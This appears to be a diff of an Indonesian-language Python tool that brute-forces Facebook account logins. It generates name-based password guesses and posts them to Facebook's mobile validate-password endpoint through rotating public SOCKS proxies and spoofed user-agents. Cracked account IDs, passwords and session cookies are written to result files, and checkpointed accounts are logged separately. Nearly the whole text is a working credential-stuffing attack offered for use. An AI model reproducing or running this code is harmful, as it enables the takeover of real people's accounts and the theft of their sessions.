@@ -673,147 +673,140 @@ def setting():
 
 
 # -------------------[ BAGIAN-WORDLIST ]------------#
-def passwrd():
-    Console(width=50, style="bold hot_pink2").print(
-        Panel(
-            """[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
-[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""",
-            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]",
-        )
-    )
-    with tred(max_workers=30) as pool:
-        for yuzong in id2:
-            idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
-            frs = nmf.split(" ")[0]
-            pwv = []
-            if len(nmf) < 6:
-                if len(frs) < 3:
-                    pass
-                else:
-                    pwv.append(nmf)
-                    #pwv.append(frs + "123")
-                    #pwv.append(frs + "1234")
-                    #pwv.append(frs + "12345")
-                    #pwv.append(frs + "123456")
-                    #pwv.append(frs + "321")
-            else:
-                if len(frs) < 3:
-                    pwv.append(nmf)
-                else:
-                    pwv.append(nmf)
-                    #pwv.append(frs + "123")
-                    #pwv.append(frs + "1234")
-                    #pwv.append(frs + "12345")
-                    #pwv.append(frs + "123456")
-                    #pwv.append(frs + "321")
-            if "ya" in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:
-                pass
-            if "async" in method:
-                pool.submit(crack, idf, pwv)
-            else:
-                pool.submit(crack, idf, pwv)
-
-    Console(width=50, style="bold hot_pink2").print(
-        Panel(
-            "[italic green]Crack Selesai [italic white]",
-            subtitle="",
-            subtitle_align="left",
-        )
-    )
-    print(f"[•] OK : %s " % (ok))
-    print(f"[•] CP : %s " % (cp))
-    print("")
-    Console(width=50, style="bold hot_pink2").print(
-        Panel(
-            "[italic green]Lanjut apa Udah ? Pilih (Y/T) [italic white]",
-            subtitle="╭───",
-            subtitle_align="left",
-            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (SELESAI) [bold green]<[bold yellow]<[bold red]<",
-        )
-    )
-    woi = Console().input("[bold hot_pink2]   ╰─> ")
-    if woi in ["y", "Y"]:
-        exit()
-    else:
-        Console(width=50, style="bold hot_pink2").print(
-            Panel(
-                "[italic green]love Sayangku [italic white]",
-                subtitle="",
-                subtitle_align="left",
-            )
-        )
-        time.sleep(2)
-        exit()
-
-
-def ua_valid():
-    rr = random.randint
-    rc = random.choice
-    android = random.choice(["07","08","09","10","12","13","14"])
-    redmi1 = random.choice(["zh-tw","en-us","zh-cn"])
-    redmi2 = random.choice(["2201116SI","2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","SM-G570M","SM-A307FN"])
-    redmi3 = random.choice(["TQ1A.210812.016","MX44LN.230804.001","TD1A.220303.001","TKQ1.221114.001","TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
-    redmi4 = f"Mozilla/5.0 (Linux; U; Android {android}; {redmi1}; {redmi2} Build/{redmi3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.{str(rr(8,9))}.{str(rr(5,221128))} swan-mibrowser"
-    return rc([redmi4])
-
-def iphonee():
-    rr = random.randint
-    rc = random.choice
-    iphone1 = random.choice(["4_3","9_0"])
-    iphone2 = random.choice(["en-US","en-GB","%lang2%"])
-    iphone3 = random.choice(["533.17.9","600.1.4"])
-    iphone4 = random.choice(["5.0.2","9_0"])
-    iphone = f"Mozilla/5.0 (iPhone; CPU iPhone OS {iphone1} like Mac OS X; {iphone2}) adbeat.com/policy AppleWebKit/{iphone3} (KHTML, like Gecko) Version/{iphone4} Mobile/12A366 Safari/{str(rr(600,6533))}.{str(rr(1,18))}.{str(rr(4,5))}"
-    return rc([iphone])
-
-
-# --------------------[ METODE-MOBILE ]-----------------#
-def crack(idf, pwv):
-    global loop, ok, cp
-    sys.stdout.write(f"\r╭─> {str(loop)}/{len(id2)} OK-:{ok} CP-:{cp}"),
-    sys.stdout.flush()
-    ses = requests.Session()
-    ua = ua_valid()
-    ua2 = iphonee()
-    for pw in pwv:
-        try:
-            ses.headers.update({"Host": "free.prod.facebook.com","cache-control": "max-age=0","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
-            link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr")
-            data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
-            cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
-            headd = {"Host": "free.prod.facebook.com","content-length": "153","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
-            post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0",data=data,cookies={'cookie': cuoz},headers=headd,allow_redirects=False,)
-            if "checkpoint" in ses.cookies.get_dict().keys():
-                tree = Tree("")
-                tree.add(f"[bold red]uid : {idf}").add(
-                    f"[bold red]password : {pw}", style="bold white"
-                )
-                tree.add(f"[bold red]useragent : {ua}", style="bold white")
-                print(tree)
-                open("CP/" + "ASEP-CP.txt", "a").write(idf + "|" + pw + "\n")
-                akun.append(idf + "|" + pw)
-                cp += 1
-                break
-            elif "c_user" in ses.cookies.get_dict().keys():
-                ok += 1
-                coki = ses.cookies.get_dict()
-                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-                tree = Tree("")
-                tree.add(f"[bold green]uid : {idf}").add(
-                    f"[bold green]password : {pw}", style="bold white"
-                )
-                tree.add(f"[bold green]cookie : {kuki}", style="bold white")
-                print(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
-                break
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop += 1
+def passwordlist():
+	global prog,des
+	x_shinchan('──'* 25)
+	print(f'            {puti} [WAITING•TUNGGULAH]           ')
+	x_shinchan('──'* 25)
+	with tred(max_workers=30) as pool:
+			for yuzong in id2:
+				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+				frs = nmf.split(' ')[0]
+				pwx = []
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+						
+				else:
+					if len(frs)<3:
+						pwx.append(nmf)
+					else:
+						pwx.append(nmf)
+					pwx.append(frs+frs)
+					pwx.append(frs+'123')
+					pwx.append(frs+'1234')
+					pwx.append(frs+'12345')
+					pwx.append(frs+'123456')
+					pwx.append(frs+'321')
+					pwx.append(frs+'01')
+					pwx.append(frs+'02')
+					pwx.append(frs+'03')
+					pwx.append(frs+'04')
+					pwx.append(frs+'05')
+					pwx.append(frs+'06')
+					pwx.append(frs+'07')
+					pwx.append(frs+'08')
+					pwx.append(frs+'09')
+					pwx.append(frs+'10')
+					pwx.append(frs+'12')
+					pwx.append(frs+'99')
+					
+				if 'ya' in pwpluss:
+					for xpwd in pwnya:
+						pwx.append(xpwd)
+				else:pass
+				if 'B-API' in method:
+				    pool.submit(crack,idf,pwv)
+				elif 'kontol' in method:
+				    pool.submit(xshinchan,idf,pwx)
+				elif 'validate' in method:
+				    pool.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
+#----------[ METODE-VALIDATE ]----------#	
+def crackvalidate(idf,pwx,url):
+	global loop,ok,cp
+	bo = random.choice([hijo,KON,])
+	rc = random.choice
+	sys.stdout.write(f"\r{bo}𝙍𝙖𝙯𝙤𝙧 𝙓𝙙 🕸{puti}{puti}[{loop}]{puti}{puti}[{hijo}{len(id)}{puti}][{puti}ok:{puti}{hijo}{ok}{P}][{puti}cp:{puti}{kun}{cp}{P}]{puti}{P}[{bo}{idf}{P}]")
+	ses = requests.Session()
+	for pw in pwx:
+		try:
+			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+			open('socksku.txt','w').write(proxs)
+			nip = rc(proxs)
+			proxs = {'http': 'socks5://'+nip}
+			rr = random.randint
+			ua = random.choice(ugen)
+			ua2 = rc(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
+			link = ses.get("https://m.prod.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			date = (
+			{
+			"lsd":
+			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+			"jazoest":
+			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+	        "uid":idf,
+	        "next": "https://x.facebook.com/v13.0/dialog/oauth?display=popup&response_type=code&client_id=1228878007175405&redirect_uri=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook&state=adb3174a9d95b35b079097f6fc72338f&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=fc06039c-fdb6-4206-aca9-fe761849929a&tp=unspecified",
+	        "flow":"login_no_pin",
+	        "pass":pw,
+	        } 
+	    )    
+			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
+			head=(
+		{
+		'Host': url,
+		'cache-control': 'max-age=0',
+		'upgrade-insecure-requests': '1',
+		'origin': f'https://'+url,
+	     'content-type': 'application/x-www-form-urlencoded',
+	     'x-requested-with': 'XMLHttpRequest',
+		'user-agent': ua,
+		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+		'sec-fetch-site': 'same-origin',
+	     'sec-fetch-mode': 'navigate',
+	     'sec-fetch-user': '?1',
+	     'sec-fetch-dest': 'document',
+		'dpr': f'{str(rr(1,5))}',
+		'viewport-width': f'{str(rr(300,999))}',
+	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
+	     'sec-ch-ua-mobile': '?1',
+	     'sec-ch-ua-platform': '"Android"',
+	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
+	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
+	     'sec-ch-prefers-color-scheme': 'dark',
+	     'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+	     'accept-encoding': 'gzip, deflate, br',
+	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+	     }
+	 )
+			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False,proxies=proxs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki = ses.cookies.get_dict()
+				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
+				print(f"⌲ Password: {hijo}{pw}{puti}")
+				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
+				print(f'{hijo}{ua}')
+				open('XSHIN-OK/'+'XSHIN-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('XSHIN-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				break			
+			elif "checkpoint" in po.cookies.get_dict().keys():
+				print(f"\n⌲ User ID: {kun}{idf}{puti}")
+				print(f"⌲ Password: {kun}{pw}{puti}")
+				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{kun}{ua}')
+				open('XSHIN-CP/'+'XSHIN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				akune.append(idf+'|'+pw)
+				ceker(idf,pw)
+				cp+=1
+				break	
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
 
 def asep():
